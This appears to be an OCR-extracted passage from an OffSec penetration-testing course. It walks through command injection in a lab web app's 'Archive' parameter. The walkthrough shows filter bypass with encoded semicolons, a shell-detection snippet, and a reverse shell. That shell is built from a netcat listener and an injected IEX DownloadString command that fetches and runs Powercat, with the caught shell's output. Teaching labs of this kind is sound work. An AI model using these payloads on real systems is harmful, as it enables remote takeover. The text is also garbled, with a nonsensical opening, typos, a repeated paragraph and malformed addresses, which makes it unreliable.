
# Attention: our business didn't go so well... We decided to switch to the tech area!

Since we found our code had needed to create any decrypt amounts. Anyway, we hired a new person and he had a fantastic idea. We will provide a service to archive, backup and process requests. We use quantum encryption to protect our customers data. If we will need your help to process requests and when we launch it will get a free left over donut and 10 days VIP subscription for free.

Enter the following command in the input below:

```
$ git clone repository_URL
$ git clone https://github.com/username repository
```

![](img/336d6ea891e7464f18ad64426619ced4_279_0.png)

Figure 144: Clone command for the ExploitDB repository

After we click on the cloning process of the ExploitDB repository.

![](img/336d6ea891e7464f18ad64426619ced4_279_1.png)

Figure 145: Successfully cloned the ExploitDB Repository via the Web Application

The output shows that the repository was successfully cloned.

Cloning the repository will result in an error within the lab environment. However, to follow along the walkthrough we can just skip this step.

Furthermore, the actual command is displayed in the web application's output. Let's try to inject arbitrary commands using ifconfig, itconfig and hostname with curl. We'll switch over to HTTP history in Burp to understand the POST request. The request indicates the "Archive" parameter for the command.

```
POST /archive HTTP/1.1
Host: 192.168.1.100:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

Archive=itconfig%3Dgithub.com%2Foffensive-security%2Fexploit
```

![](img/336d6ea891e7464f18ad64426619ced4_279_2.png)

Figure 146: Archive Parameter in the POST request

The figure shows that the "Archive" parameter contains the Git command. This means we can use curl to provide our commands to POST. We will do this by using the -X parameter to change the request type to POST. We will also use -data to specify what data is sent in the POST request.

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

Penetration Testing with Kali Linux

```
kali@kali:~$ curl -X POST --data...=ipconfig 'Archive=http://192.168.50.189:8000/archive
```

Command Injection Detected. Aborting...%(EXTRA string:=ipconfig)

Listing 166 - Detected Command Injection for ipconfig

On our first try, we web the web application that detected a command injection attempt with the ipconfig command. Let's try to backtrack from the working input and find a bypass for the filter. Next, we'll try to provide the git command for the Archive parameter in the POST request.

```
kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
```

An error occurred with execution: exit status 1 and use: git [--version] [--help] [-C <path>] [-c <name>=<value>] [--exec<path>] [--path] [--man-path] [--info-path] [-p] |paginate| [-p] |no-path| [----no-replace] [--bare]

push update remote remotes with associated associates

'git help -a' and 'git help -g' list subcommands and concept guides. See 'git help <command>' or 'git help <concept>' to read about a specific subcommand or concept. See 'git help git' for an overview of the system.

The output shows the page for the git command, confirming that we are not restricted to using git. Since we know that providing "git" works for execution, we can try to specify any git command and execute. If this is executed, we will establish that the web application is running on Windows or Linux, the output of git includes the "Windows" string for Windows. If the web application is running Linux, it will only show the version.

```
kali@kali:~$ curl -X POST -data 'Archive=git version' http://192.168.50.189:8000/archive
```

Repository successfully connected with command: git version and 2.35.windows

Listing 167 - Using git to operate the operating system

The output shows that the web application is running on Windows. Now we can use trial and error to poke around the filter and see what was allowed. Since established we cannot simply specify another command, let's try to combine the git and ipconfig commands with a URL-encoded semicolon as "%3B". Semicolons can be used in a majority of command lines, such as PowerShell or Bash as a delimiter using "&&", to specify consecutive commands. Alternatively, we can use another method.

- 443 (Git SCM, 2022), https://git-scm.com/docs/git/
- 444 (Git for Windows, 2022), https://gitforwindows.org/
- 445 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows-server/administration/windows-cmd

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

```
kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

git help -a and 'git help -g' list available commands and some concept guides. See 'git help <command>' or 'git help <command>' to read about a specific subcommand or concept. See 'git help!' for an overview of the system.

# Windows IP Configuration

| Connection-specific DNS Suffix | |
| :--- | --- |
| IPv4 Address | 192.168.50.189 |
| Subnet Mask | 255.255.255.0 |
| Default Gateway | 192.168.50.254 |

Listing 168 - Entering git and ipconfig with embedded semicolon

The output shows that both commands were executed. We can ensure that "git" is executed or perhaps contains filter in the "Archive" parameter. Next, let's out more how our injected commands are executed. We will first determine if our commands are executed by PowerShell or CMD. In a situation like this, we can use a handy snippet, published by PowerShell that displays "CMD" or "PowerShell" depending on where it is executed.

```
dir>&1 * [echo CMD];<rem # PowerShell
```

Listing 169 - Code Snippet to check where our code is executed

```
kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%20%23%26%20%50%6Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell=http://192.168.50.189:8000/archive
```

Listing 170 - Determining where the injected commands are executed

The output contains "PowerShell", meaning that our injected commands are executed in a PowerShell environment.

Next, let's leverage command injection to achieve system access. We will use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat in Kali. Let's start a new terminal, copy Powercat to the home directory for the kali user, and start a Python3 web server in the same directory.

```
kali@kali:~$ cp /usr/share/powershell-emire/server/data/module_source/management/powercat.ps
```

- 446 (Stackoverflow, 2020), https://stackoverflow.com/users/403407/user403407
- 447 (Github, 2020), https://github.com/besiminhoorno/powercat

```
kali@kali:~$ python3 -m httpserver 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Listing 171 - Start Powercat via Python3 web server

Next, we will start a third terminal to create a Netcat listener on port 4444 to catch the reverse shell.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

Listing 172 - Starting Netcat listener on port 4444

The output shows that the web application is running on Windows. Now we can use trial and error to poke around the filter and see what was allowed. Since established we cannot simply specify another command, let's try to combine the git and ipconfig commands with a URL-encoded semicolon as "%3B". Semicolons can be used in a majority of command lines, such as PowerShell or Bash as a delimiter using "&&", to specify consecutive commands. Alternatively, we can use another method.

```
kali@kali:~$ curl -X POST --data 'Archive=IEX(New-Object System.WebClient).DownloadString("http://192.168.119/powercat.ps");powercat -c192.168.119.3 -p4444 -e powershell' http://192.168.119:8000/archive
```

Listing 173 - Downloading Powercat and executing a shell

Again, we use curl to encode the command and send it to the server.

```
kali@kali:~$ python3 -m httpserver 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Listing 174 - Powercat web server shows GET request for powercat

192.168.50.189 - [05/Apr/2022 09:05:48] GET /powercat.ps HTTP/1.1" 200 -
```

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from [UNKNOWN] [192.168.50.189] 50325
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\Administrator\meteor>
```

Listing 175 - Successful reverse shell connection via Command Injection

Listing 176 shows that we received a reverse shell. Instead of using powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection
